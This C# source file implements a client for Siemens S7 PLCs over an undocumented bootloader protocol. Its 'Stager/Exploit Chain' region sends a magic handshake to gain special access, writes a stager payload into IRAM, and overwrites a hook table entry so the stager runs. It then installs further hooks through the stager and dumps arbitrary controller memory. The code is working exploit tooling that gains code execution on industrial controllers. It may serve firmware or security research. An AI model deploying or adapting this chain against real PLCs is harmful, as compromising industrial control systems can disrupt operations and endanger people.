using System;
using S7.Net.Interfaces;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Linq;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading;
using Microsoft.Extensions.Logging;

namespace S7.Net
{
    /// <summary>
    /// The main client for communicating with Siemens S7 PLCs using the undocumented bootloader protocol.
    /// Provides methods for handshake, stager installation, memory operations, and payload management.
    /// </summary>
    public sealed class PlcClient : IDisposable
    {
        private readonly ICommunicationChannel _channel;
        private readonly PlcProtocol _protocol;
        private readonly ILogger<PlcClient> _logger;
        private uint _nextPayloadLocation = PlcConstants.DUMPER_PAYLOAD_LOCATION;
        private bool _disposed;

        /// <summary>
        /// Initializes a new instance of the <see cref="PlcClient"/> class.
        /// </summary>
        public PlcClient(ICommunicationChannel channel, ILoggerFactory loggerFactory)
        {
            if (loggerFactory == null) throw new ArgumentNullException(nameof(loggerFactory));
            _channel = channel ?? throw new ArgumentNullException(nameof(channel));
            _logger = loggerFactory.CreateLogger<PlcClient>();
            _protocol = new PlcProtocol(channel, loggerFactory.CreateLogger<PlcProtocol>());
        }

        /// <summary>
        /// Indicates whether the client is connected to the PLC.
        /// </summary>
        public bool IsConnected => _channel.IsConnected;

        private byte[] GetBigEndianBytes(uint value)
        {
            var bytes = BitConverter.GetBytes(value);
            if (BitConverter.IsLittleEndian)
            {
                Array.Reverse(bytes);
            }
            return bytes;
        }

        /// <summary>
        /// Invokes a primary handler on the PLC.
        /// </summary>
        public async Task<byte[]?> InvokePrimaryHandler(byte handlerIndex, byte[] args, bool awaitResponse = true, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            var payload = new byte[1 + args.Length];
            payload[0] = handlerIndex;
            Array.Copy(args, 0, payload, 1, args.Length);
            await _protocol.SendPacketAsync(payload, cancellationToken: cancellationToken);
            if (!awaitResponse) return null;
            try
            {
                return await _protocol.ReceivePacketAsync(cancellationToken);
            }
            catch (ChecksumMismatchException ex)
            {
                _logger.LogError(ex, "Checksum mismatch in response to handler 0x{HandlerIndex:X2}", handlerIndex);
                throw; // Re-throw the exception
            }
        }

        #region Stager/Exploit Chain
        /// <summary>
        /// Performs the initial handshake to gain special access to the PLC.
        /// </summary>
        public async Task<bool> PerformHandshakeAsync(CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _logger.LogInformation("Starting handshake...");
            byte[] magic = Encoding.ASCII.GetBytes(PlcConstants.HANDSHAKE_MAGIC);
            byte[] padding = Encoding.ASCII.GetBytes(PlcConstants.HANDSHAKE_PADDING);
            var handshakePayload = padding.Concat(magic).ToArray();

            for (int attempt = 0; attempt < 100; attempt++)
            {
                cancellationToken.ThrowIfCancellationRequested();
                await _protocol.RawWriteAsync(handshakePayload, 0, handshakePayload.Length, cancellationToken);
                var sw = Stopwatch.StartNew();
                var responseBuffer = new System.Collections.Generic.List<byte>();
                while (sw.ElapsedMilliseconds < PlcConstants.HANDSHAKE_TIMEOUT_MS)
                {
                    cancellationToken.ThrowIfCancellationRequested();
                    if (_protocol.DataAvailable)
                    {
                        var tmpBuf = new byte[256];
                        int bytesRead = await _protocol.RawReadAsync(tmpBuf, 0, tmpBuf.Length, cancellationToken);
                        if (bytesRead > 0)
                        {
                            responseBuffer.AddRange(tmpBuf.Take(bytesRead));
                            var ascii = Encoding.ASCII.GetString(responseBuffer.ToArray());
                            _logger.LogDebug("Handshake attempt {Attempt}: buf={Buffer} ASCII={Ascii}", attempt + 1, BitConverter.ToString(responseBuffer.ToArray()), ascii);
                            if (ascii.Contains(PlcConstants.HANDSHAKE_SUCCESS_SIGNATURE))
                            {
                                _logger.LogInformation("Handshake successful: Found -CPU signature!");
                                return true;
                            }
                        }
                    }
                    await Task.Delay(PlcConstants.HANDSHAKE_POLL_DELAY_MS, cancellationToken);
                }
                if (responseBuffer.Count > 0)
                {
                    var ascii = Encoding.ASCII.GetString(responseBuffer.ToArray());
                    _logger.LogDebug("Handshake final buf={Buffer} ASCII={Ascii}", BitConverter.ToString(responseBuffer.ToArray()), ascii);
                    if (ascii.Contains(PlcConstants.HANDSHAKE_SUCCESS_SIGNATURE))
                    {
                        _logger.LogInformation("Handshake successful (after silence): Found -CPU signature!");
                        return true;
                    }
                }
                await Task.Delay(PlcConstants.HANDSHAKE_RETRY_DELAY_MS, cancellationToken);
            }
            _logger.LogWarning("Handshake failed.");
            return false;
        }

        /// <summary>
        /// Gets the version of the PLC bootloader.
        /// </summary>
        public async Task<string> GetVersion(CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _logger.LogInformation("Getting bootloader version...");
            var response = await InvokePrimaryHandler(PlcConstants.HANDLER_GET_VERSION, Array.Empty<byte>(), true, cancellationToken);
            if (response is null) throw new Exception("Failed to get version due to a communication error (likely a checksum mismatch).");
            _logger.LogDebug("[VERSION RAW HEX] {Hex}", BitConverter.ToString(response));
            _logger.LogDebug("[VERSION RAW ASCII] {Ascii}", Encoding.ASCII.GetString(response));
            int idxV = Array.IndexOf(response, (byte)'V');
            string version = "(invalid)";
            if (idxV >= 0 && response.Length >= idxV + 4)
            {
                version = $"V{response[idxV + 1]}.{response[idxV + 2]}.{response[idxV + 3]}";
            }
            else if (response.Length >= 6)
            {
                version = $"{(char)response[2]}{response[3]}.{response[4]}.{response[5]}";
            }
            _logger.LogInformation("Got version: {Version}", version);
            return version;
        }

        /// <summary>
        /// Enters a subprotocol mode.
        /// </summary>
        private async Task EnterSubprotocol(int mode, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _logger.LogInformation("Entering subprotocol mode {Mode}...", mode);
            ushort magic = PlcConstants.SUBPROT_80_MODE_MAGICS[mode];
            byte[] payload = BitConverter.GetBytes(magic);
            if (BitConverter.IsLittleEndian) Array.Reverse(payload);
            var response = await InvokePrimaryHandler(PlcConstants.HANDLER_ENTER_SUBPROTOCOL, payload, true, cancellationToken);
            if (response == null || !response.SequenceEqual(PlcConstants.ANSW_ENTER_SUBPROTO_SUCCESS))
                throw new Exception("Failed to enter subprotocol.");
            _logger.LogInformation("Entered subprotocol successfully.");
        }

        /// <summary>
        /// Leaves the current subprotocol mode.
        /// </summary>
        private async Task LeaveSubprotocol(CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _logger.LogInformation("Leaving subprotocol...");
            await _protocol.SendPacketAsync(PlcConstants.CMD_LEAVE_SUBPROTOCOL, cancellationToken: cancellationToken);
            try
            {
                await _protocol.ReceivePacketAsync(cancellationToken);
            }
            catch (ChecksumMismatchException ex)
            {
                _logger.LogError(ex, "Checksum mismatch while leaving subprotocol.");
                throw;
            }
        }

        /// <summary>
        /// Writes data to the PLC in subprotocol mode.
        /// </summary>
        private async Task RawSubprotocolWrite(uint address, byte[] data, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            var payload = new byte[PlcConstants.CMD_RAW_WRITE_PREFIX.Length + 4 + data.Length];
            Array.Copy(PlcConstants.CMD_RAW_WRITE_PREFIX, 0, payload, 0, PlcConstants.CMD_RAW_WRITE_PREFIX.Length);
            var addrBytes = GetBigEndianBytes(address);
            Array.Copy(addrBytes, 0, payload, PlcConstants.CMD_RAW_WRITE_PREFIX.Length, 4);
            Array.Copy(data, 0, payload, PlcConstants.CMD_RAW_WRITE_PREFIX.Length + 4, data.Length);

            await _protocol.SendPacketAsync(payload, cancellationToken: cancellationToken);
            try
            {
                await _protocol.ReceivePacketAsync(cancellationToken);
            }
            catch (ChecksumMismatchException ex)
            {
                _logger.LogError(ex, "Checksum mismatch in response to RawSubprotocolWrite.");
                throw;
            }
        }

        /// <summary>
        /// Writes a chunk of data to IRAM.
        /// </summary>
        private async Task WriteChunkToIram(uint targetAddress, byte[] contents, CancellationToken cancellationToken = default)
        {
            uint targetArgument = targetAddress - PlcConstants.IRAM_ADDRESS_OFFSET;
            await RawSubprotocolWrite(targetArgument, Enumerable.Repeat((byte)0xFF, contents.Length).ToArray(), cancellationToken);
            await RawSubprotocolWrite(targetArgument, contents, cancellationToken);
        }

        /// <summary>
        /// Writes data to IRAM.
        /// </summary>
        public async Task WriteToIram(uint targetAddress, byte[] contents, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _logger.LogInformation("Writing {Length} bytes to IRAM at 0x{TargetAddress:X8}", contents.Length, targetAddress);
            await EnterSubprotocol(PlcConstants.SUBPROT_80_MODE_IRAM, cancellationToken);

            for (int i = 0; i < contents.Length; i += PlcConstants.IRAM_WRITE_CHUNK_SIZE)
            {
                cancellationToken.ThrowIfCancellationRequested();
                int size = Math.Min(PlcConstants.IRAM_WRITE_CHUNK_SIZE, contents.Length - i);
                var chunk = new byte[size];
                Array.Copy(contents, i, chunk, 0, size);
                _logger.LogDebug("Writing chunk {ChunkNumber}...", i / PlcConstants.IRAM_WRITE_CHUNK_SIZE + 1);
                await WriteChunkToIram(targetAddress + (uint)i, chunk, cancellationToken);
            }

            await LeaveSubprotocol(cancellationToken);
            _logger.LogInformation("Finished writing to IRAM.");
        }

        /// <summary>
        /// Installs the stager payload onto the PLC.
        /// </summary>
        public async Task InstallStager(byte[] stagerPayload, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _logger.LogInformation("Starting stager installation...");
            await WriteToIram(PlcConstants.IRAM_STAGER_START, stagerPayload, cancellationToken);

            _logger.LogInformation("Overwriting hook table entry...");
            var hookEntryPayload = new byte[6];
            hookEntryPayload[0] = PlcConstants.STAGER_HOOK_VAR_LEN_ARG_1;
            hookEntryPayload[1] = PlcConstants.STAGER_HOOK_VAR_LEN_ARG_2;

            var addrBytes = GetBigEndianBytes(PlcConstants.IRAM_STAGER_START);
            Array.Copy(addrBytes, 0, hookEntryPayload, 2, 4);

            await WriteToIram(PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);

            _logger.LogInformation("Stager installation complete.");
            _logger.LogInformation("[PROTOCOL] Stager installed at hook index 0x{HookIndex:X2}", PlcConstants.DEFAULT_STAGER_ADDHOOK_IND);
            _logger.LogInformation("[PROTOCOL] Hook table address: 0x{Address:X8}", PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2);
            _logger.LogInformation("[PROTOCOL] Stager code address: 0x{Address:X8}", PlcConstants.IRAM_STAGER_START);
            _logger.LogInformation("[PROTOCOL] Stager is ready for use");
        }
        #endregion

        #region Stager Communication
        /// <summary>
        /// Encodes a packet for transmission via the stager.
        /// </summary>
        private byte[] EncodePacketForStager(byte[] chunk)
        {
            for (int i = 1; i < 256; i++)
            {
                byte key = (byte)i;
                bool keyInChunk = chunk.Contains(key);
                bool keyIsLength = (key == chunk.Length + 2);
                if (!keyInChunk && !keyIsLength)
                {
                    var encoded = new byte[chunk.Length + 1];
                    encoded[0] = key;
                    for (int j = 0; j < chunk.Length; j++)
                    {
                        encoded[j + 1] = (byte)(chunk[j] ^ key);
                    }
                    return encoded;
                }
            }
            throw new Exception("Could not find a suitable XOR key to encode chunk.");
        }

        /// <summary>
        /// Sends a full message via the stager.
        /// </summary>
        public async Task SendFullMsgViaStager(byte[] msg, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            int maxChunkSize = PlcConstants.MAX_MSG_LEN - 1;
            for (int i = 0; i < msg.Length; i += maxChunkSize)
            {
                cancellationToken.ThrowIfCancellationRequested();
                await Task.Delay(10, cancellationToken);

                int size = Math.Min(maxChunkSize, msg.Length - i);
                var chunk = new byte[size];
                Array.Copy(msg, i, chunk, 0, size);

                _logger.LogDebug("[BYTES] Send progress: 0x{Progress:X6}/0x{Total:X6} ({Percent:P2})", i, msg.Length, (float)i / msg.Length);
                var encoded = EncodePacketForStager(chunk);
                _logger.LogTrace("[BYTES] Encoded chunk (with XOR key): {Chunk}", BitConverter.ToString(encoded));
                await _protocol.SendPacketAsync(encoded, 8, 10, cancellationToken);
                _logger.LogDebug("[BYTES] Chunk sent at offset {Offset}. Awaiting ACK...", i);

                byte[]? ack = null;
                try
                {
                    ack = await _protocol.ReceivePacketAsync(cancellationToken);
                }
                catch (ChecksumMismatchException ex)
                {
                    _logger.LogError(ex, "Checksum mismatch while waiting for ACK from stager.");
                    throw;
                }
                if (ack == null || ack.Length != 1)
                {
                    _logger.LogError("[BYTES] Expected single-byte ACK, got: {Ack}", ack != null ? BitConverter.ToString(ack) : "<null>");
                    throw new Exception($"Did not receive expected empty ACK from stager at chunk offset {i}");
                }

                byte ackValue = ack[0];
                _logger.LogDebug("[BYTES][ACK] Value received: 0x{AckValue:X2}", ackValue);
                if (ackValue == PlcConstants.STAGER_INTERRUPT_ACK)
                {
                    _logger.LogWarning("[BYTES] Received interrupt ACK (0xFF). Aborting.");
                    throw new Exception("Interrupt ACK (0xFF)");
                }
            }
            var endPacket = EncodePacketForStager(Array.Empty<byte>());
            _logger.LogTrace("[BYTES] Sending end packet: {Packet}", BitConverter.ToString(endPacket));
            await _protocol.SendPacketAsync(endPacket, cancellationToken: cancellationToken);
            byte[]? finalAck = null;
            try
            {
                finalAck = await _protocol.ReceivePacketAsync(cancellationToken);
            }
            catch (ChecksumMismatchException ex)
            {
                _logger.LogError(ex, "Checksum mismatch while waiting for final ACK from stager.");
                throw;
            }
            _logger.LogDebug("[BYTES] Received end packet ACK (length={Length}): {Ack}", finalAck?.Length ?? -1, finalAck != null ? BitConverter.ToString(finalAck) : "<null>");
        }

        /// <summary>
        /// Invokes an additional hook on the PLC.
        /// </summary>
        public async Task<byte[]?> InvokeAddHook(int hookNo, byte[] args, bool awaitResponse = true, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            if (hookNo < 0 || hookNo > 0x20)
                throw new ArgumentOutOfRangeException(nameof(hookNo));

            var payload = new byte[1 + args.Length];
            payload[0] = (byte)hookNo;
            Array.Copy(args, 0, payload, 1, args.Length);

            return await InvokePrimaryHandler(PlcConstants.HANDLER_INVOKE_ADD_HOOK, payload, awaitResponse, cancellationToken);
        }

        /// <summary>
        /// Writes data to the PLC via the stager.
        /// </summary>
        public async Task WriteViaStager(uint address, byte[] contents, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            var addressBytes = GetBigEndianBytes(address);
            await InvokeAddHook(PlcConstants.DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false, cancellationToken);
            await SendFullMsgViaStager(contents, cancellationToken);
        }

        /// <summary>
        /// Installs an additional hook via the stager.
        /// </summary>
        public async Task InstallAddHookViaStager(uint targetAddress, byte[] payload, int newHookNo, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            var hookEntry = new byte[8];
            hookEntry[3] = 0xff;
            hookEntry[4] = (byte)(targetAddress >> 24);
            hookEntry[5] = (byte)(targetAddress >> 16);
            hookEntry[6] = (byte)(targetAddress >> 8);
            hookEntry[7] = (byte)targetAddress;
            await WriteViaStager(PlcConstants.ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry, cancellationToken);

            await WriteViaStager(targetAddress, payload, cancellationToken);
        }

        /// <summary>
        /// Receives a large amount of data from the PLC.
        /// </summary>
        public async Task<byte[]> ReceiveMany(IProgress<long> progress, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            using (var ms = new MemoryStream())
            {
                while (true)
                {
                    cancellationToken.ThrowIfCancellationRequested();
                    byte[]? chunk = null;
                    try
                    {
                        chunk = await _protocol.ReceivePacketAsync(cancellationToken);
                    }
                    catch (ChecksumMismatchException ex)
                    {
                        _logger.LogError(ex, "Checksum mismatch during ReceiveMany.");
                        throw;
                    }
                    if (chunk == null || chunk.Length == 0)
                    {
                        break;
                    }
                    await ms.WriteAsync(chunk, 0, chunk.Length, cancellationToken);
                    progress?.Report(ms.Length);
                }
                return ms.ToArray();
            }
        }

        public async Task<byte[]> DumpMemoryAsync(uint address, uint length, byte[] dumpMemPayload, IProgress<long> progress, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");

            cancellationToken.ThrowIfCancellationRequested();

            _logger.LogInformation("Installing memory dumper payload...");
            await InstallAddHookViaStager(_nextPayloadLocation, dumpMemPayload, PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND, cancellationToken);
            _nextPayloadLocation += (uint)dumpMemPayload.Length;
            if (_nextPayloadLocation % 4 != 0)
            {
                _nextPayloadLocation = _nextPayloadLocation - (_nextPayloadLocation % 4) + 4;
            }
            _logger.LogInformation("Memory dumper payload installed.");

            cancellationToken.ThrowIfCancellationRequested();

            _logger.LogInformation("Requesting memory dump of {Length} bytes from 0x{Address:X8}...", length, address);
            var args = new byte[1 + 4 + 4];
            args[0] = PlcConstants.DUMP_COMMAND_START_BYTE;
            var addrBytes = GetBigEndianBytes(address);
            var lenBytes = GetBigEndianBytes(length);
            Array.Copy(addrBytes, 0, args, 1, 4);
            Array.Copy(lenBytes, 0, args, 5, 4);

            var response = await InvokeAddHook(PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND, args, true, cancellationToken);

            if (response == null || !Encoding.ASCII.GetString(response).TrimEnd('\0').StartsWith("Ok"))
            {
                var responseStr = response != null ? BitConverter.ToString(response) : "<null>";
                throw new Exception($"Failed to start memory dump. Unexpected response: {responseStr}");
            }

            cancellationToken.ThrowIfCancellationRequested();

            _logger.LogInformation("Memory dump started. Receiving data...");
            var data = await ReceiveMany(progress, cancellationToken);
            _logger.LogInformation("Memory dump complete. Received {Length} bytes.", data.Length);
            return data;
        }
        #endregion

        public void Dispose()
        {
            if (_disposed) return;

            // The PlcClient takes ownership of the injected channel and is responsible for its disposal.
            if (_channel is IDisposable disposableChannel)
            {
                disposableChannel.Dispose();
            }

            _disposed = true;
        }
    }
}